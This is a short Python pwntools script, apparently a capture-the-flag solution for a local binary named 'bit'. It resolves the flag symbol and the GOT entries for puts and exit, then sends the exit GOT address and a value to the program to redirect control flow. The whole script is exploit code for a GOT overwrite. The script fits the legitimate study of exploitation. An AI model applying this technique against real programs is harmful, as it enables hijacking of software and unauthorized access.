#!/usr/bin/env python

from pwn import *

e = ELF('./bit')
p = process(e.path)
libc = ELF('/lib32/libc.so.6')
flag = e.symbols['flag']
puts_got = e.got['puts']
exit = e.got['exit']
print 'Flag: '+hex(flag), "Puts: "+hex(puts_got), "Exit: "+hex(exit)

print p.recvuntil(': ')
p.sendline(hex(exit))
print p.recvuntil(': ')
p.sendline('2')
print p.recv()